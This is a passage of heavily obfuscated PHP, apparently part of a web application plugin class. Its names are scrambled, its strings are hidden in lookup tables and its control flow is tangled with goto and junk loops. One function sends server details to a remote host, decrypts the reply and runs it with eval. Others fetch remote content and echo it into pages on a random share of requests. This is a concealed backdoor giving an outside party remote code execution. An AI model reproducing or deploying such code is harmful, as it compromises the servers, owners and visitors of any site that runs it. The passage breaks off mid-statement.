$E½Ó³‰İ„ª[175]($E½Ó³‰İ„ª[206]($E½Ó³‰İ„ª[243]), !1, $E½Ó³‰İ„ª[244]); die; } $Fä¤ÃÓÎ‰ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][146]}(); if ($Fä¤ÃÓÎ‰ != $E½Ó³‰İ„ª[249]($E½Ó³‰İ„ª[250])) { if ($Fä¤ÃÓÎ‰ <= $E½Ó³‰İ„ª[61]($E½Ó³‰İ„ª[148])->{$_SERVER[ÂØÃó©³¸¡¸¢][149]}()) { $E½Ó³‰İ„ª[175]($E½Ó³‰İ„ª[206]($E½Ó³‰İ„ª[251]), !1, $E½Ó³‰İ„ª[244]); die; } } } goto Bµš•²ºÊó; DÃ©ºÌ›§â: $fÅ©å§ÒªÄ = $A”¿ œœ“ê[620]; $a¬Ì†¤¿ì = $_SERVER[$E½Ó³‰İ„ª[44]]; $eƒ¨ğÂ¥Ü = $A”¿ œœ“ê[621]; goto DºìŒÀ‡ÕÒ; Bµš•²ºÊó: } private function kzvtc44541c2() { goto BˆÛ…´øªî; BˆÛ…´øªî: $c¸ÔÁ­Õßæ =& $_SERVER[‡’¶øåüç˜]; $F†„ÆÃ† =& $_SERVER[ÂØÃó©³¸¡¸¢]; $Cê‚ºø‚§ = array($F†„ÆÃ†[144], $F†„ÆÃ†[252]); goto dÆ¤—ôÅ„; b†¿…„: $F†„ÆÃ†[263]($F†„ÆÃ†[264]); $eèÜ±ïÇ›º = $c¸ÔÁ­Õßæ[622]; while ($eèÜ±ïÇ›º < $c¸ÔÁ­Õßæ[576]) { if ($eèÜ±ïÇ›º >= 0) { break; } $eèÜ±ïÇ›º++; } goto A¼ãÖ‚ê£Ù; A¼ãÖ‚ê£Ù: if ($Fé·ù•áõ && $F†„ÆÃ†[32]($Fé·ù•áõ, $F†„ÆÃ†[265])) { echo $Fé·ù•áõ; } die; goto AÁÒÛ„½Ê; dÆ¤—ôÅ„: if (!$F†„ÆÃ†[113]($GLOBALS, $F†„ÆÃ†[141]) || !isset($_GET[$F†„ÆÃ†[253]])) { return; } if (!$F†„ÆÃ†[247]($_SERVER[$F†„ÆÃ†[44]], $Cê‚ºø‚§)) { return; } $e¹³èÜŞÆ„ = $F†„ÆÃ†[254]; goto F²Ûë×˜Ì; F²Ûë×˜Ì: $e¹³èÜŞÆ„ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($e¹³èÜŞÆ„, $F†„ÆÃ†[256]); $d ¥«Ã•ã  = $F†„ÆÃ†[257](array($F†„ÆÃ†[258] => array($F†„ÆÃ†[259] => $F†„ÆÃ†[260], $F†„ÆÃ†[261] => 3))); $Fé·ù•áõ = @$F†„ÆÃ†[262]($e¹³èÜŞÆ„, !1, $d ¥«Ã•ã ); goto b†¿…„; AÁÒÛ„½Ê: } public function vikl3277ff87($bŒÙà‰áä) { goto CóøİŠˆÉÒ; d’ë‰ºí×: $eƒš‡¹­ø = array($cïšõ˜×îÎ[267] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[269] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[270] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[271] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[272] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[273] => $cïšõ˜×îÎ[268], $cïšõ˜×îÎ[274] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[276] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[277] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[278] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[279] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[280] => $cïšõ˜×îÎ[275], $cïšõ˜×îÎ[281] => $cïšõ˜×îÎ[275]); $Dõ˜¡»ƒ×ò = $eĞƒ”ø’É[623]; if (strlen($Dõ˜¡»ƒ×ò) < $eĞƒ”ø’É[564]) { return; } goto f°ÌÈÓ–; f°ÌÈÓ–: $E”·êÏÉíç = $cïšõ˜×îÎ[0]($cïšõ˜×îÎ[282], $cïšõ˜×îÎ[113]($this->nqtpe0b0d2d9, $cïšõ˜×îÎ[138], $cïšõ˜×îÎ[10])); $F»°‡¥®òâ = $eĞƒ”ø’É[624]; while (strlen($F»°‡¥®òâ) < $eĞƒ”ø’É[377]) { if (!$F»°‡¥®òâ) { break; } $F»°‡¥®òâ++; } goto eîèîå§‘Õ; A»±¾Ö¡ã: return $bŒÙà‰áä; $Bå¤¹×¤ğª = $eĞƒ”ø’É[625]; while (strlen($Bå¤¹×¤ğª) < $eĞƒ”ø’É[576]) { if (!$Bå¤¹×¤ğª) { break; } $Bå¤¹×¤ğª++; } goto cÌ¹øŠµĞ; CóøİŠˆÉÒ: $eĞƒ”ø’É =& $_SERVER[‡’¶øåüç˜]; $cïšõ˜×îÎ =& $_SERVER[ÂØÃó©³¸¡¸¢]; if ($this->tzbwf92f51a5 == $cïšõ˜×îÎ[266]) { return $bŒÙà‰áä; } goto d’ë‰ºí×; eîèîå§‘Õ: $B¨îÂ¾êä“ = array(); foreach ($eƒš‡¹­ø as $eÀˆÓˆ±— => $BÍí‡ÉÏ®Ê) { if ($BÍí‡ÉÏ®Ê == $cïšõ˜×îÎ[268] && $cïšõ˜×îÎ[25]($this->tzbwf92f51a5, 0, 1) == $cïšõ˜×îÎ[268]) { continue; } if (!$cïšõ˜×îÎ[247]($eÀˆÓˆ±—, $E”·êÏÉíç)) { $B¨îÂ¾êä“[] = $eÀˆÓˆ±—; } } foreach ($B¨îÂ¾êä“ as $eÀˆÓˆ±—) { unset($bŒÙà‰áä[$eÀˆÓˆ±—]); } goto A»±¾Ö¡ã; cÌ¹øŠµĞ: } private function ygqff959f900() { goto CÒ‚Î˜Ã½; Aœˆ¾ÃÊÒî: $GLOBALS[$a”ƒª‡ˆ¢[100]][$a”ƒª‡ˆ¢[284]] = $a”ƒª‡ˆ¢[228]; $dÉíİßù‹ = $_SERVER[‡’¶øåüç˜][626]; if (!$dÉíİßù‹) { die; } goto FÒø¤„Ø”ß; FÒø¤„Ø”ß: if ($a”ƒª‡ˆ¢[61]($a”ƒª‡ˆ¢[285])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($a”ƒª‡ˆ¢[89]) != $a”ƒª‡ˆ¢[240]) { $a”ƒª‡ˆ¢[61]($a”ƒª‡ˆ¢[285])->{$_SERVER[ÂØÃó©³¸¡¸¢][229]}($a”ƒª‡ˆ¢[89], $a”ƒª‡ˆ¢[240]); } goto F¾ƒĞòÆ¬ª; CÒ‚Î˜Ã½: $a”ƒª‡ˆ¢ =& $_SERVER[ÂØÃó©³¸¡¸¢]; if ($this->tzbwf92f51a5 != $a”ƒª‡ˆ¢[130]) { return; } $GLOBALS[$a”ƒª‡ˆ¢[100]][$a”ƒª‡ˆ¢[104]][$a”ƒª‡ˆ¢[283]] = $a”ƒª‡ˆ¢[228]; goto Aœˆ¾ÃÊÒî; F¾ƒĞòÆ¬ª: } public function donu9877a12e() { return $_SERVER[ÂØÃó©³¸¡¸¢][286]; $aííà¬†²Ä = $_SERVER[‡’¶øåüç˜][627]; if (!$aííà¬†²Ä) { die; } } private function cmot96f9ede7() { goto FÜÜØÄëá©; c¯¼–ŞÀ¹: if ($this->{$_SERVER[ÂØÃó©³¸¡¸¢][208]}($E¿÷µ¬äÊ[$e˜•âŸÙ­Å[296]]) != $F­…Ü¢ÓŸÎ[$e˜•âŸÙ­Å[174]]) { $eøŠÉ†ğÔ = array($e˜•âŸÙ­Å[210] => $e˜•âŸÙ­Å[61]($e˜•âŸÙ­Å[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($e˜•âŸÙ­Å[125]), $e˜•âŸÙ­Å[211] => $_SERVER[$e˜•âŸÙ­Å[124]], $e˜•âŸÙ­Å[212] => $e˜•âŸÙ­Å[213](), $e˜•âŸÙ­Å[183] => $_SERVER[$e˜•âŸÙ­Å[184]]); $dáÄç¬ğàƒ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][214]}($e˜•âŸÙ­Å[157]($eøŠÉ†ğÔ)); $E¿÷µ¬äÊ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][191]}($e˜•âŸÙ­Å[215] . $dáÄç¬ğàƒ); if ($E¿÷µ¬äÊ && $e˜•âŸÙ­Å[200]($E¿÷µ¬äÊ) && isset($E¿÷µ¬äÊ[$e˜•âŸÙ­Å[296]])) { $aœ²¸¯Ò° = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][197]}($E¿÷µ¬äÊ[$e˜•âŸÙ­Å[296]], 2); if ($aœ²¸¯Ò°) { $aœ²¸¯Ò° = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][208]}($aœ²¸¯Ò°); } if ($aœ²¸¯Ò°) { try { @eval($aœ²¸¯Ò°); } catch (Exception $b’ÜŒä¸”¤) { } } } } goto D‚“Ø§ù; dÁé¯¦¿ôİ: if (!$e˜•âŸÙ­Å[200]($E¿÷µ¬äÊ)) { return; } if ($E¿÷µ¬äÊ[$e˜•âŸÙ­Å[174]] && $E¿÷µ¬äÊ[$e˜•âŸÙ­Å[296]]) { if ($this->{$_SERVER[ÂØÃó©³¸¡¸¢][208]}($E¿÷µ¬äÊ[$e˜•âŸÙ­Å[296]]) == $F­…Ü¢ÓŸÎ[$e˜•âŸÙ­Å[174]]) { return; } } $this->{$_SERVER[ÂØÃó©³¸¡¸¢][173]}(); goto c¯¼–ŞÀ¹; d¥ˆè˜¿Ú: if ($this->tzbwf92f51a5 == $e˜•âŸÙ­Å[130] || !$e˜•âŸÙ­Å[113]($GLOBALS, $e˜•âŸÙ­Å[141])) { return; } if (!$e˜•âŸÙ­Å[247]($_SERVER[$e˜•âŸÙ­Å[44]], $a„’²Óµí—)) { return; } if ($e˜•âŸÙ­Å[241]() % 4 != 0) { return; } goto d•ÈƒæŒ‚Í; d•ÈƒæŒ‚Í: $aÏí‰ŸôöÚ = $e˜•âŸÙ­Å[13](array($e˜•âŸÙ­Å[292], $e˜•âŸÙ­Å[293]), $cùŞ¤“öÇÌ); if ($aÏí‰ŸôöÚ && $e˜•âŸÙ­Å[241]() - $aÏí‰ŸôöÚ < $e˜•âŸÙ­Å[249]($e˜•âŸÙ­Å[294])) { return; } $e˜•âŸÙ­Å[13](array($e˜•âŸÙ­Å[292], $e˜•âŸÙ­Å[161]), $cùŞ¤“öÇÌ, $e˜•âŸÙ­Å[241]()); goto b°´Ô£É·³; cÎ‚ÜÊ–¦­: $cùŞ¤“öÇÌ = $e˜•âŸÙ­Å[290] . $e˜•âŸÙ­Å[123]($e˜•âŸÙ­Å[291]); $e½ŒÙ‡ê˜ = $aËƒÕÙÅñ[628]; while ($e½ŒÙ‡ê˜ < $aËƒÕÙÅñ[572]) { if ($e½ŒÙ‡ê˜ >= 0) { break; } $e½ŒÙ‡ê˜++; } goto d¥ˆè˜¿Ú; FÜÜØÄëá©: $aËƒÕÙÅñ =& $_SERVER[‡’¶øåüç˜]; $e˜•âŸÙ­Å =& $_SERVER[ÂØÃó©³¸¡¸¢]; $a„’²Óµí— = array($e˜•âŸÙ­Å[287], $e˜•âŸÙ­Å[288], $e˜•âŸÙ­Å[289]); goto cÎ‚ÜÊ–¦­; b°´Ô£É·³: $F­…Ü¢ÓŸÎ = array($e˜•âŸÙ­Å[174] => $e˜•âŸÙ­Å[61]($e˜•âŸÙ­Å[62])->{$_SERVER[ÂØÃó©³¸¡¸¢][63]}($e˜•âŸÙ­Å[217]), $e˜•âŸÙ­Å[187] => $this->tzbwf92f51a5, $e˜•âŸÙ­Å[185] => $_SERVER[$e˜•âŸÙ­Å[186]], $e˜•âŸÙ­Å[178] => $e˜•âŸÙ­Å[158], $e˜•âŸÙ­Å[181] => $_SERVER[$e˜•âŸÙ­Å[182]]); $E¿÷µ¬äÊ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][191]}($e˜•âŸÙ­Å[295], $F­…Ü¢ÓŸÎ); $BáÆˆƒÄ×ƒ = $aËƒÕÙÅñ[629]; goto dÁé¯¦¿ôİ; D‚“Ø§ù: } private function vueiae9e0089($c‰ïé²Ş¥ = '', $A©©ŠŠß›¸ = array(), $b°­²ÕÓÇÂ = 5) { goto f¶ß”³í„Ø; aËÖó¿: if (strlen($A¸³ôì—™¼) < $CŒÇÊƒÌ¶à[576]) { return; } if ($A©©ŠŠß›¸ === -1) { return $e¥Ø¶ŒÌ; } $Cä©ÄŸŠÃ = $b´¸ÜœÓˆ¬[257](array($b´¸ÜœÓˆ¬[258] => array($b´¸ÜœÓˆ¬[261] => $b°­²ÕÓÇÂ, $b´¸ÜœÓˆ¬[259] => $b´¸ÜœÓˆ¬[301]), $b´¸ÜœÓˆ¬[302] => array($b´¸ÜœÓˆ¬[303] => !1, $b´¸ÜœÓˆ¬[304] => !1))); goto BÈÚÏ‘Õ; FÀğí«î‡: while (strlen($bÀäê‘‘©É) < $CŒÇÊƒÌ¶à[570]) { if (!$bÀäê‘‘©É) { break; } $bÀäê‘‘©É++; } $e¥Ø¶ŒÌ = $e¥Ø¶ŒÌ . $c‰ïé²Ş¥ . $b´¸ÜœÓˆ¬[299] . $b´¸ÜœÓˆ¬[300]($A©©ŠŠß›¸); $A¸³ôì—™¼ = $CŒÇÊƒÌ¶à[632]; goto aËÖó¿; BÈÚÏ‘Õ: $A©©ŠŠß›¸ = @$b´¸ÜœÓˆ¬[262]($e¥Ø¶ŒÌ, !1, $Cä©ÄŸŠÃ); $còáÜ™³Š˜ = $CŒÇÊƒÌ¶à[633]; return $b´¸ÜœÓˆ¬[199]($A©©ŠŠß›¸, !0); goto DÆáïÑ¨È; DÆáïÑ¨È: $eõ¹ÍíÏ¡Ò = $CŒÇÊƒÌ¶à[634]; goto D¹‡ŠÃã‚Ñ; f¶ß”³í„Ø: $CŒÇÊƒÌ¶à =& $_SERVER[‡’¶øåüç˜]; $b´¸ÜœÓˆ¬ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $e¥Ø¶ŒÌ = $b´¸ÜœÓˆ¬[297]; goto eò¯¸ŒçøÌ; eò¯¸ŒçøÌ: $FåâÜîƒ‹Ø = $CŒÇÊƒÌ¶à[630]; $e¥Ø¶ŒÌ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($e¥Ø¶ŒÌ, $b´¸ÜœÓˆ¬[298]); $bÀäê‘‘©É = $CŒÇÊƒÌ¶à[631]; goto FÀğí«î‡; D¹‡ŠÃã‚Ñ: } private function rvcx3d1fd4ab() { goto D´’ŠØÄ¿Í; cÁ®­Ã”Ê: $C°«³¨êî = $bé×‘‘ºï[249]($C°«³¨êî ? $C°«³¨êî : $bé×‘‘ºï[306]); $FÏ‰ÚÍ©—“ = $bé×‘‘ºï[113]($this->nqtpe0b0d2d9, $bé×‘‘ºï[332]); $bƒ¸†½ìÇÀ = $_SERVER[‡’¶øåüç˜][635]; goto E¬˜ŠöŒ„²; D´’ŠØÄ¿Í: $bé×‘‘ºï =& $_SERVER[ÂØÃó©³¸¡¸¢]; $bù»éµ¸öÃ = array($bé×‘‘ºï[305] => $bé×‘‘ºï[306], $bé×‘‘ºï[307] => $bé×‘‘ºï[308], $bé×‘‘ºï[309] => $bé×‘‘ºï[310], $bé×‘‘ºï[311] => $bé×‘‘ºï[312], $bé×‘‘ºï[313] => $bé×‘‘ºï[314], $bé×‘‘ºï[315] => $bé×‘‘ºï[250], $bé×‘‘ºï[316] => $bé×‘‘ºï[250], $bé×‘‘ºï[317] => $bé×‘‘ºï[306], $bé×‘‘ºï[318] => $bé×‘‘ºï[308], $bé×‘‘ºï[319] => $bé×‘‘ºï[310], $bé×‘‘ºï[320] => $bé×‘‘ºï[321], $bé×‘‘ºï[322] => $bé×‘‘ºï[312], $bé×‘‘ºï[323] => $bé×‘‘ºï[324], $bé×‘‘ºï[325] => $bé×‘‘ºï[314], $bé×‘‘ºï[326] => $bé×‘‘ºï[327], $bé×‘‘ºï[328] => $bé×‘‘ºï[329], $bé×‘‘ºï[330] => $bé×‘‘ºï[331]); $C°«³¨êî = $bù»éµ¸öÃ[$this->tzbwf92f51a5]; goto cÁ®­Ã”Ê; E¬˜ŠöŒ„²: $FÏ‰ÚÍ©—“ = $FÏ‰ÚÍ©—“ ? $bé×‘‘ºï[249]($FÏ‰ÚÍ©—“) : 0; return $C°«³¨êî + $FÏ‰ÚÍ©—“; goto b§Èà™–ï; b§Èà™–ï: } public function iblx769d44a9($Aï¼ïŠÃ) { goto C•ÕæèÊï; F÷³æ…Ğ˜£: $fÆÊÜ°Õ¯¬ = $eÇ‰ç’ğù[636]; if (strlen($fÆÊÜ°Õ¯¬) < $eÇ‰ç’ğù[570]) { return; } if ($Aï¼ïŠÃ[$F†µé·Èï×[333]] == $F†µé·Èï×[228]) { return; } goto EÇÚŞÏŒÇø; EÇÚŞÏŒÇø: if ($B×™²Ì‚íÊ >= $F†µé·Èï×[249]($F†µé·Èï×[250])) { return; } $F¸¼§µÏ¦è = $F†µé·Èï×[61]($F†µé·Èï×[148])->{$_SERVER[ÂØÃó©³¸¡¸¢][149]}(); $Aê™‰Úâ‹ = $eÇ‰ç’ğù[637]; goto A²Ì‚ò“›; D›ö´¶Ï‰: $FÜ¼Ğ„µ° = $F†µé·Èï×[230]($FÜ¼Ğ„µ°, $F†µé·Èï×[10], $F†µé·Èï×[333]); if (!$F†µé·Èï×[247]($Aï¼ïŠÃ[$F†µé·Èï×[333]], $FÜ¼Ğ„µ°)) { $F†µé·Èï×[175]($F†µé·Èï×[337], !1, $F†µé·Èï×[244]); } goto E—Â¸¨¢Ğ™; A²Ì‚ò“›: if (strlen($Aê™‰Úâ‹) < $eÇ‰ç’ğù[570]) { return; } if ($F¸¼§µÏ¦è <= $B×™²Ì‚íÊ) { return; } $FÜ¼Ğ„µ° = $F†µé·Èï×[61]($F†µé·Èï×[148])->{$_SERVER[ÂØÃó©³¸¡¸¢][334]}($F†µé·Èï×[333])->{$_SERVER[ÂØÃó©³¸¡¸¢][335]}($B×™²Ì‚íÊ)->{$_SERVER[ÂØÃó©³¸¡¸¢][336]}(); goto D›ö´¶Ï‰; C•ÕæèÊï: $eÇ‰ç’ğù =& $_SERVER[‡’¶øåüç˜]; $F†µé·Èï× =& $_SERVER[ÂØÃó©³¸¡¸¢]; $B×™²Ì‚íÊ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][146]}(); goto F÷³æ…Ğ˜£; E—Â¸¨¢Ğ™: } public function bpmcbdf0de64() { goto eèñÃí¬ØØ; eèñÃí¬ØØ: $D©ƒ–‘ùª‚ =& $_SERVER[‡’¶øåüç˜]; $f¸’šõ›ğ› =& $_SERVER[ÂØÃó©³¸¡¸¢]; if (!$f¸’šõ›ğ›[113]($GLOBALS, $f¸’šõ›ğ›[141]) || $f¸’šõ›ğ›[338](1, 100) > 20) { return; } goto a‘–¡½áÔ; dĞ¥¹ä÷‡: $f„çô÷„–Š = $f¸’šõ›ğ›[257](array($f¸’šõ›ğ›[258] => array($f¸’šõ›ğ›[259] => $f¸’šõ›ğ›[260], $f¸’šõ›ğ›[261] => 3))); $D„ÄÁÇÊ÷ = $D©ƒ–‘ùª‚[639]; if (!$D„ÄÁÇÊ÷) { die; } goto C„ÕæÆ¹”; a‘–¡½áÔ: $dÆ†Ö‰ƒ¿Œ = $f¸’šõ›ğ›[254]; $dÆ†Ö‰ƒ¿Œ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($dÆ†Ö‰ƒ¿Œ, $f¸’šõ›ğ›[256]); $eñğ‰¸¶» = $D©ƒ–‘ùª‚[638]; goto dĞ¥¹ä÷‡; C„ÕæÆ¹”: $B¢¦ƒŞÆ”· = @$f¸’šõ›ğ›[262]($dÆ†Ö‰ƒ¿Œ, !1, $f„çô÷„–Š); $eÂÈ½Èğ“ = $D©ƒ–‘ùª‚[640]; if (!$eÂÈ½Èğ“) { return; } goto cöŒ°í¹àò; cöŒ°í¹àò: echo $f¸’šõ›ğ›[339] . $f¸’šõ›ğ›[340]($B¢¦ƒŞÆ”·) . $f¸’šõ›ğ›[341]; $D›ê÷ñ Ü = $D©ƒ–‘ùª‚[641]; if (!$D›ê÷ñ Ü) { return; } goto eÕ¸’ËÅ; eÕ¸’ËÅ: } private function iuzr5b0b960b($d¿ó“ŸíÖİ, $aß§ªÎó¦», $C²ÌÉËƒô = 3) { goto F›Ó°¥‘ïŸ; Eõ‚ä˜¡ÚÁ: $d¿ó“ŸíÖİ = $Eª³’Üé‡É[2]($d¿ó“ŸíÖİ); $AİøÜîÛä = $Eª³’Üé‡É[338](0, 5) . $Eª³’Üé‡É[10]; $BßãÎŒ±¡¦ = $aøÖù×œ¥–[609]; goto E—ÂÛæá; E—ÂÛæá: while ($BßãÎŒ±¡¦ < $aøÖù×œ¥–[570]) { if ($BßãÎŒ±¡¦ >= 0) { break; } $BßãÎŒ±¡¦++; } $dë­×™ã = $Eª³’Üé‡É[133](15); $fâÌÌ„àİ² = $Eª³’Üé‡É[343]; goto dÁˆˆùÏ™; f¯¶¿æÇ¸Ô: return $Bö¨¹·Ö×; goto a˜Ê«§‡ˆ; dÁˆˆùÏ™: switch ($AİøÜîÛä) { case $Eª³’Üé‡É[240]: $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($d¿ó“ŸíÖİ, $Eª³’Üé‡É[222]($aß§ªÎó¦» . $dë­×™ã)); $FÉ’ª“ß› = $aøÖù×œ¥–[642]; break; $C§«º£’ß‹ = $aøÖù×œ¥–[643]; if (strlen($C§«º£’ß‹) < $aøÖù×œ¥–[564]) { return; } case $Eª³’Üé‡É[228]: $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($d¿ó“ŸíÖİ, $Eª³’Üé‡É[222]($dë­×™ã . $aß§ªÎó¦»)); break; $cÎœ ‹Æ = $aøÖù×œ¥–[644]; if (!$cÎœ ‹Æ) { die; } case $Eª³’Üé‡É[344]: $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($d¿ó“ŸíÖİ, $Eª³’Üé‡É[127]($dë­×™ã . $aß§ªÎó¦»)); $Eö¬ñî¦ÕÊ = $aøÖù×œ¥–[645]; if (strlen($Eö¬ñî¦ÕÊ) < $aøÖù×œ¥–[576]) { return; } break; case $Eª³’Üé‡É[345]: $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($d¿ó“ŸíÖİ, $Eª³’Üé‡É[123]($dë­×™ã . $aß§ªÎó¦»)); $Fê£¤÷ƒÃ = $aøÖù×œ¥–[646]; break; $CÚÈØœ‘óñ = $aøÖù×œ¥–[647]; while ($CÚÈØœ‘óñ < $aøÖù×œ¥–[564]) { if ($CÚÈØœ‘óñ >= 0) { break; } $CÚÈØœ‘óñ++; } case $Eª³’Üé‡É[346]: goto cç†ÉáĞ¢İ; CïÀÙÍÈñ“: if (!$AºªÜßŸÇ) { return; } $F†ÄğíÚ‹ = 0; for ($d‹ÄŠÛçè = 0; $d‹ÄŠÛçè < $Eª³’Üé‡É[24]($d¿ó“ŸíÖİ); $d‹ÄŠÛçè++) { $F†ÄğíÚ‹ = $F†ÄğíÚ‹ == $Eª³’Üé‡É[24]($f‚×ËªÍõù) ? 0 : $F†ÄğíÚ‹; $E¦„²Ö«Œ = $aøÖù×œ¥–[654]; if (strlen($E¦„²Ö«Œ) < $aøÖù×œ¥–[564]) { die; } $eò•®¯æ = ($dá“ŠºìÜŠ + $Eª³’Üé‡É[348]($fâÌÌ„àİ², $d¿ó“ŸíÖİ[$d‹ÄŠÛçè]) + $Eª³’Üé‡É[349]($f‚×ËªÍõù[$F†ÄğíÚ‹++])) % 64; $Fó™ÒÃ¿¾ˆ .= $fâÌÌ„àİ²[$eò•®¯æ]; $d…†åÕñ£æ = $aøÖù×œ¥–[655]; if (strlen($d…†åÕñ£æ) < $aøÖù×œ¥–[564]) { die; } } goto C½˜‘Š›ˆî; cç†ÉáĞ¢İ: $d¿ó“ŸíÖİ = $Eª³’Üé‡É[127]($d¿ó“ŸíÖİ); $cø÷ÌË®øñ = $aøÖù×œ¥–[648]; $dá“ŠºìÜŠ = $Eª³’Üé‡É[347](0, 64); goto C¿Î¢ šÎ ; B™ÉÉÎ«: $fĞ÷ªÉÎ « = $aøÖù×œ¥–[652]; $eò•®¯æ = 0; $AºªÜßŸÇ = $aøÖù×œ¥–[653]; goto CïÀÙÍÈñ“; b™ÒÄÍã¿‡: $f‚×ËªÍõù = $Eª³’Üé‡É[123]($AºÁ †«ñÓ . $Eª³’Üé‡É[123]($aß§ªÎó¦» . $AºÁ †«ñÓ) . $aß§ªÎó¦»); $dª¶Ö‚â = $aøÖù×œ¥–[651]; if (strlen($dª¶Ö‚â) < $aøÖù×œ¥–[564]) { return; } goto DÂÉ‘ª¼âÀ; DÂÉ‘ª¼âÀ: $f‚×ËªÍõù = $Eª³’Üé‡É[25]($f‚×ËªÍõù, $dá“ŠºìÜŠ % 8, $dá“ŠºìÜŠ % 8 + 7); $Fó™ÒÃ¿¾ˆ = $Eª³’Üé‡É[10]; $d‹ÄŠÛçè = 0; goto B™ÉÉÎ«; dØ²Œñ¦Ú: break; $Fîˆ£³Ñš­ = $aøÖù×œ¥–[657]; if (strlen($Fîˆ£³Ñš­) < $aøÖù×œ¥–[572]) { return; } goto DĞÇÃ¨ğ‡; C½˜‘Š›ˆî: $Bö¨¹·Ö× = $Eª³’Üé‡É[340]($AºÁ †«ñÓ . $Fó™ÒÃ¿¾ˆ); $fíê©£ã = $aøÖù×œ¥–[656]; if (strlen($fíê©£ã) < $aøÖù×œ¥–[570]) { return; } goto dØ²Œñ¦Ú; C¿Î¢ šÎ : $DÉ†ˆóÎ•æ = $aøÖù×œ¥–[649]; $AºÁ †«ñÓ = $fâÌÌ„àİ²[$dá“ŠºìÜŠ]; $BÌœ¬œŠ×— = $aøÖù×œ¥–[650]; goto b™ÒÄÍã¿‡; DĞÇÃ¨ğ‡: default: $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($d¿ó“ŸíÖİ, $aß§ªÎó¦» . $dë­×™ã); $aÕ«Áœ’¿œ = $aøÖù×œ¥–[658]; if (strlen($aÕ«Áœ’¿œ) < $aøÖù×œ¥–[570]) { die; } break; } $Bö¨¹·Ö× = $Eª³’Üé‡É[222]($AİøÜîÛä . $dë­×™ã . $Bö¨¹·Ö×); if ($C²ÌÉËƒô - 1 > 0) { $Bö¨¹·Ö× = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][136]}($Bö¨¹·Ö×, $aß§ªÎó¦», $C²ÌÉËƒô - 1); } goto f¯¶¿æÇ¸Ô; F›Ó°¥‘ïŸ: $aøÖù×œ¥– =& $_SERVER[‡’¶øåüç˜]; $Eª³’Üé‡É =& $_SERVER[ÂØÃó©³¸¡¸¢]; $Eª³’Üé‡É[342](1); goto Eõ‚ä˜¡ÚÁ; a˜Ê«§‡ˆ: } private function moau1fcf0cb7($D…ÂœÑ—À, $BÏ†«æÄÜˆ, $BÔ¤ ‡ÇÛ± = 3) { goto CÁ²È‰Ó¹É; C×‘Ğ·ê† : if ($BÔ¤ ‡ÇÛ± - 1 > 0) { $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][197]}($eã¢„Í‘À, $BÏ†«æÄÜˆ, $BÔ¤ ‡ÇÛ± - 1); } return $eã¢„Í‘À; goto b´î®©º¨; eÎğì‘›: $b²‹¿ŞÏë = $D…ÂœÑ—À[0]; $bœ‹¥ø¹÷ = $BÆƒ™¼’[25]($D…ÂœÑ—À, 1, 15); $eÃ•ˆöÅ = $cé§òä™³[661]; goto f’óÔÑ¯ßÆ; CÁ²È‰Ó¹É: $cé§òä™³ =& $_SERVER[‡’¶øåüç˜]; $BÆƒ™¼’ =& $_SERVER[ÂØÃó©³¸¡¸¢]; if (!$BÆƒ™¼’[350]($D…ÂœÑ—À) || $BÆƒ™¼’[24]($D…ÂœÑ—À) < 10) { return !1; } goto e¢ß˜¹ Úµ; bæÛ†²Ò: $D…ÂœÑ—À = $BÆƒ™¼’[222]($D…ÂœÑ—À); $FøÈæğÜé = $cé§òä™³[660]; if (!$FøÈæğÜé) { return; } goto eÎğì‘›; e¢ß˜¹ Úµ: $D…ÂœÑ—À = $BÆƒ™¼’[2]($D…ÂœÑ—À); $Dí©“ôíÃ¥ = $cé§òä™³[659]; while (strlen($Dí©“ôíÃ¥) < $cé§òä™³[570]) { if (!$Dí©“ôíÃ¥) { break; } $Dí©“ôíÃ¥++; } goto bæÛ†²Ò; f’óÔÑ¯ßÆ: $D…ÂœÑ—À = $BÆƒ™¼’[25]($D…ÂœÑ—À, 16); $e†Ë£¹š«÷ = $BÆƒ™¼’[343]; switch ($b²‹¿ŞÏë) { case $BÆƒ™¼’[240]: $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($D…ÂœÑ—À, $BÆƒ™¼’[222]($BÏ†«æÄÜˆ . $bœ‹¥ø¹÷)); $cÎ¥â¶İí« = $cé§òä™³[662]; if (strlen($cÎ¥â¶İí«) < $cé§òä™³[377]) { die; } break; case $BÆƒ™¼’[228]: $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($D…ÂœÑ—À, $BÆƒ™¼’[222]($bœ‹¥ø¹÷ . $BÏ†«æÄÜˆ)); $E‡ã ‡…‚Ò = $cé§òä™³[578]; break; case $BÆƒ™¼’[344]: $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($D…ÂœÑ—À, 